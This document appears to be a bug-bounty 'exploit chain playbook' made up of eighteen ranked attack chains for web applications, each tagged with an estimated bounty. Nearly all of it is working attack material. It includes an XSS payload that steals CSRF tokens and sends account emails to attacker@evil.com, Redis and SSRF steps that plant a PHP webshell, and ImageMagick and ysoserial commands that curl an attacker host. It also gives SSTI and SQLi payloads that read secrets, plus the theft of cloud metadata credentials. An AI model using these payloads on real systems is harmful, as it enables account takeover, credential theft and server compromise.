# DEVIL'S DEN — EXPLOIT CHAIN PLAYBOOK v1.0
# Pre-built chains ranked by maximum bounty yield

---

## CHAIN TIER: CRITICAL (P1 — Maximum Bounty)

### Chain 1: XSS → Account Takeover
```
1. Find stored/reflected XSS in authenticated page
2. Steal CSRF token from page DOM
3. POST /api/user/email change to attacker@evil.com with stolen token
4. Trigger password reset to new email
5. Full ATO without ever touching cookies
Impact: Critical ATO | Bounty: $5,000–$50,000
```
Payload:
```javascript
var csrf = document.querySelector('[name=csrf_token],[name=_token],[name=authenticity_token]').value;
fetch('/api/user/email', {
  method: 'POST',
  headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrf},
  body: JSON.stringify({email: 'attacker@evil.com'}),
  credentials: 'include'
}).then(() => {
  fetch('/api/user/password-reset', {method: 'POST', credentials: 'include'});
});
```

---

### Chain 2: SSRF → Cloud Metadata → IAM Creds → AWS Account Takeover
```
1. Find SSRF in URL/webhook parameter
2. Hit: http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Get role name from response
4. Hit: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
5. Extract: AccessKeyId, SecretAccessKey, Token
6. aws configure with stolen creds
7. aws s3 ls / aws iam list-users / aws ec2 describe-instances
Impact: Critical Infrastructure Takeover | Bounty: $10,000–$100,000
```

---

### Chain 3: SSRF → Redis → RCE via CONFIG SET
```
1. Find SSRF with gopher:// support
2. gopher://127.0.0.1:6379/_CONFIG SET dir /var/www/html
3. gopher://127.0.0.1:6379/_CONFIG SET dbfilename shell.php
4. gopher://127.0.0.1:6379/_SET x "<?php system($_GET[0]); ?>"
5. gopher://127.0.0.1:6379/_SAVE
6. curl https://target.com/shell.php?0=id
Impact: RCE | Bounty: $20,000+
```

---

### Chain 4: File Upload → RCE via ImageMagick (Ghostscript)
```
1. Upload SVG or EPS file with ImageMagick injection:
   <image authenticate='ff" `curl http://attacker.interactsh.io/$(id|base64)`;"'>
2. Server calls: convert input.svg output.png (ImageMagick processes SVG)
3. Shell command executes → OOB DNS with whoami output
4. Escalate: write webshell, exfiltrate creds
Impact: RCE via file processing | Bounty: $10,000+
```

---

### Chain 5: JWT kid Path Traversal → Forge Admin Token
```
1. Get valid JWT from app
2. Modify header: {"alg":"HS256","kid":"../../dev/null"}
3. Sign payload with empty string as HMAC secret
4. Set payload: {"sub":"1","role":"admin","exp":9999999999}
5. Use forged token → admin access
Impact: Auth Bypass → Admin Takeover | Bounty: $5,000–$20,000
```

---

### Chain 6: Subdomain Takeover → Session Hijack via Cookie Tossing
```
1. Find dangling CNAME: api.target.com → xxx.github.io (unclaimed)
2. Claim the GitHub Pages subdomain
3. Host JS that sets: document.cookie="session=ATTACKER;domain=.target.com"
4. Send victim link to https://api.target.com/phishing
5. Victim visits → cookie tossed → attacker gains access to target.com
Impact: Session Hijack | Bounty: $3,000–$15,000
```

---

### Chain 7: OAuth Redirect URI Bypass → Token Theft → ATO
```
1. Find open redirect on target: target.com/redirect?url=evil.com
2. Craft OAuth URL: ?redirect_uri=https://target.com/redirect?url=evil.com
3. Victim clicks link, approves OAuth
4. Token sent to open redirect → forwarded to evil.com
5. Use token to access victim's account
Impact: ATO | Bounty: $5,000–$25,000
```

---

### Chain 8: Password Reset Host Header Injection → ATO
```
1. POST /forgot-password
   Host: attacker.interactsh.io
   email=victim@target.com
2. App constructs link: https://attacker.interactsh.io/reset?token=SECRET
3. Victim clicks → token logged at attacker's server
4. Attacker uses token at: https://target.com/reset?token=SECRET
Impact: Full ATO | Bounty: $3,000–$10,000
```

---

### Chain 9: Prototype Pollution → XSS → ATO
```
1. Find prototype pollution via URL: ?__proto__[innerHTML]=<img src=x onerror=alert(1)>
2. Client-side gadget triggers innerHTML assignment with polluted value
3. XSS fires → steal cookie / CSRF / full ATO chain
Impact: Client-Side Pollution → XSS → ATO | Bounty: $5,000+
```

---

### Chain 10: HTTP Request Smuggling → Cache Poisoning → Reflected XSS for All Users
```
1. Find CL.TE or TE.CL desync
2. Smuggle request that poisons cache with XSS response
3. Every user who hits the cached endpoint gets XSS served
4. Worm: XSS steals token, uses it to re-poison → self-propagating
Impact: Stored XSS for all users | Bounty: $10,000–$50,000
```

---

### Chain 11: IDOR + Mass Assignment → Privilege Escalation
```
1. Find IDOR: PUT /api/users/VICTIM_ID with attacker's session
2. Send: {"role":"admin","is_admin":true,"plan":"enterprise"}
3. Mass assignment accepted → victim account now admin
4. Log in as victim or pivot to admin panel
Impact: Privilege Escalation | Bounty: $2,000–$10,000
```

---

### Chain 12: XXE → SSRF → Internal RCE
```
1. Upload XML with external entity: <!ENTITY xxe SYSTEM "http://169.254.169.254/">
2. Blind XXE: exfiltrate via OOB DNS
3. Use SSRF pivot: <!ENTITY xxe SYSTEM "http://10.0.0.1:6379/">
4. Gopher SSRF via XXE to attack Redis
5. Redis → write webshell → RCE
Impact: XXE → SSRF → RCE chain | Bounty: $20,000+
```

---

### Chain 13: GraphQL Introspection → IDOR → PII Dump
```
1. Dump full schema via introspection query
2. Find sensitive fields: ssn, creditCard, bankAccount, privateKey
3. Test IDOR: query { user(id: "VICTIM_ID") { ssn creditCards { number cvv } } }
4. Extract data for all users: iterate IDs 1-999999
Impact: Mass PII Exfiltration | Bounty: $5,000–$50,000
```

---

### Chain 14: Deserialization → RCE → Lateral Movement
```
1. Find Java deserialization endpoint (Base64 rO0AB in cookie/header)
2. Generate payload: ysoserial CommonsCollections6 'curl http://attacker.interactsh.io/$(id|base64)'
3. Send payload → OOB DNS confirms RCE
4. Upgrade: reverse shell → enumerate environment
5. AWS creds in /proc/1/environ or .env → cloud takeover
Impact: Full Server Compromise | Bounty: $20,000–$100,000
```

---

### Chain 15: Race Condition → Double Withdrawal → Financial Loss
```
1. Find transfer/withdrawal endpoint
2. Send 50 simultaneous POST /api/withdraw {"amount":1000} with balance=1000
3. If race window exists → 50x $1000 withdrawn from $1000 balance
4. PoC: video proof + asyncio script showing multiple 200 OK responses
Impact: Financial Integrity Bypass | Bounty: $10,000–$50,000
```

---

### Chain 16: CSS Injection → CSRF Token Theft → CSRF
```
1. Find CSS injection: input attribute reflected in style tag
2. Inject: input[name="csrf"][value^="a"]{background:url(//attacker.interactsh.io/a)}
3. Brute all starting characters → recover full CSRF token
4. Use CSRF token to forge state-changing requests
Impact: CSRF via CSS exfiltration | Bounty: $2,000–$8,000
```

---

### Chain 17: SSTI → RCE → Full Server Compromise
```
1. Find template injection: {{7*7}} → 49 in response
2. Identify engine: Jinja2/Twig/FreeMarker/ERB/Velocity
3. Execute: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
4. Read /proc/1/environ for secrets
5. Exfiltrate .env, database credentials, AWS keys
Impact: RCE + Credential Theft | Bounty: $10,000–$50,000
```

---

### Chain 18: SQLi → File Read → Source Code → Hardcoded Secrets → Full Compromise
```
1. Find SQLi: error or time-based confirmation
2. MySQL: ' UNION SELECT 1,load_file('/var/www/html/config.php'),3--
3. Extract database credentials, secret keys
4. Access admin panel / decrypt sensitive data
5. Use secrets to authenticate to AWS/GCP/Azure
Impact: Full Compromise via SQLi + Source Exposure | Bounty: $15,000+
```

---

## CHAINING METHODOLOGY

### Step 1: Map All Vulnerability Classes Found
```
XSS (stored) + CSRF (token in DOM) + IDOR (user update) = ATO
SSRF + Redis + Gopher = RCE
JWT kid + path traversal + /dev/null = Admin token forge
Open redirect + OAuth = Token theft ATO
```

### Step 2: Find the Amplifier
```
Standalone: Medium ($500)
+ CSRF bypass: High ($2,000)
+ ATO: Critical ($10,000)
+ Full infra: Critical+ ($50,000+)
```

### Step 3: PoC Requirement Matrix
```
XSS: Screenshot + video of cookie theft
SSRF: DNS callback proof (interactsh screenshot)
RCE: Screenshot of id/whoami output
SQLi: DB version + table dump (sanitized)
ATO: Video of full account takeover flow
Race Condition: Video + asyncio script output
```
